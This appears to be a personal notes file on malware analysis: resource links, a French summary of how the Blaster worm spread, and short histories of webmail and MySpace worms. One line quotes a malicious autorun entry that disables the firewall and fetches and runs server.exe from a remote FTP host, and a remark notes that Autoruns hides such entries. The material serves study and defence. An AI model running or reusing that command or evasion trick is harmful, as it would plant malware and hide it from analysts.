# malware / virus

# malware techniques
https://github.com/secrary/InjectProc # process injection
https://securedorg.github.io/RE101/

# collection of malware source code
https://github.com/vxunderground/MalwareSourceCode

# extract macros from office documents
http://blog.didierstevens.com/2014/12/23/oledump-extracting-embedded-exe-from-doc/

# excel malicious macro
http://carnal0wnage.attackresearch.com/2015/01/enigma0x3s-generate-macro-powershell.html

# quick scan
https://github.com/Neo23x0/Loki.git

# online testing
https://malwr.com/
https://www.metascan-online.com/
reverse.it/hybrid-analysis.com
vscan.novirusthanks.org # with check box that says "Do not distribute the sample"

# dynamic analysis
http://www.darknet.org.uk/2016/05/captipper-explore-malicious-http-traffic/ (observe HTTP traffic from pcap)

# analysis
http://haxf4rall.com/2017/07/26/flare-vm-a-fully-customizable-windows-based-security-distribution-for-malware-analysis-incident-response-penetration-testing/ # flare vm
https://github.com/GoSecure/malboxes
http://www.malware-analyzer.com/malware-analysis-tools/
http://cuckoosandbox.org/

# see if anyone else has seen the file
fileadvisor.bit9.com

# silly autoruns
HKLM\software\wow6432node\microsoft\windows\currentversion\run
blah REG_SZ c:\windows\SysWow64\cmd.exe /c net1 stop sharedaccess&echo open 6.6.6.6 > cmd.txt&echo 123>> cmd.txt&echo 123>> cmd.txt&echo binary >> cmd.txt&echo get server.exe>> cmd.txt&echo bye >> cmd.txt&ftp -s:cmd.txt&p -s:cmd.txt&server.exe&del ...

any entry with a value that starts with c:\windows\syswow64\cmd sysinternal\autoruns will not be shown by sysinternals/autoruns

# virus (history, interviews, online ezines ...)
http://spth.virii.lu/main.htm

# volatility
http://blog.hackeracademy.com/wp-content/uploads/2012/12/THA-Deep-Dive-Analyzing-Malware-in-Memory.pdf

# blaster
Blaster/Lovsan : vers exploitant une vulnerabilité dans l'interface DCOM du système d'exploitation Windows (XP et 2000).
16 juillet 2003: vuln découverte par le groupe polonais Last Stage of Delirium et MS publie le correctif MS03-026.
11 aout    2003: premiere detection du vers, puis apparition des variantes B,C,...

DCOM est utilisé pour la communication inter-processus, cela permet à un
programme actif sur une machine locale d'exécuter du code sur une machine
distante. Ce protocole est une variante du protocole RPC de l'Open Software
Foundation (OSF) comportant des extensions Microsoft spécifiques.

La faille est de type débordement de tampon, son exploitation permet, via une
requête formatée convenablement, d'exécuter du code arbitraire sur une machine
vulnérable.

Mécanisme d'infection
1. Generation de 20 adresses IP aléatoires qui permet une diffusion optimale
2. connect(T:135)
3. Pour les connexions établies, injection d'une partie du code malveillant (exploit ou charge)
4. Comme l'adresse de retour (et donc le code de l'exploit) est different entre win2k et winXP, 1 fois sur 4, c'est la charge pour win2k qui est envoyé, sinon c'est pour winXP
5. connect(T:4444)
6. tftp -l <adresse IP de la machine infectante> GET msblash.exe
7. Execution du ver pour infecter la victime (start msblast.exe)
8. Creation du mutex "Billy" pour eviter la surinfection et d'une clef de registre pour rendre le ver persistent au reboot
9. à partir du 16 aout, DoS windowsupdate.com : envoi d'un paquet Syn toute les 20ms avec adresse source aleatoire (spoofée)

Remarques diverses
  - Erreur du programmeur du ver: possible de faire des mises à jour windows avec d'autres URL
windowsupdate.microsoft.com (windows update du menu démarrer)
www.microsoft.com/isapi/redir.dll?prd=Win2000&ar=WinUpdate
  - choix de la date préméditée (vacances (machines éteintes) puis retour de vacances (infection) et DoS (retarder maj) = augmenter impact)
  - correctif MS03-049 mi-novembre pour une vuln dans Workstation Service (2000 et XP): perte de la confiance des utilisateurs? En tout cas, importance d'une reactivité serieuse dans l'application des correctifs pour les systèmes perclus de failles!

# famous worms/viruses
* yammer
Js.Yamanner@m Yahoo! Mail worm. It appeared on June 11, 2006 and was the first webmail interface worm

* Nduja
Another proof-of-concept webmail worm is Nduja, a cross-domain worm for four Italian webmail services. Find more details on Rosario Valotta's paper. Both webmail worms have the goal to harvest email addresses, something a criminal hacker could make money with.

* MySpace phishing 34k user/passwords
In December 2006, 34000 actual user names and passwords were stolen in a MySpace phishing attack.
The idea of the attack was to create a profile page named ¿login_home_index_html¿, so the URL looked very convincing.
Specially-crafted HTML and CSS was used to hide the genuine MySpace content from the page and instead display its own login form.

* MySpace Samy 
This worm automatically sent a friend request to Samy (the attacker) simply by visiting his profile.
Within several hours he had over 1 million friend requests, but it creates too much traffic on MySpace, so that the site goes offline.
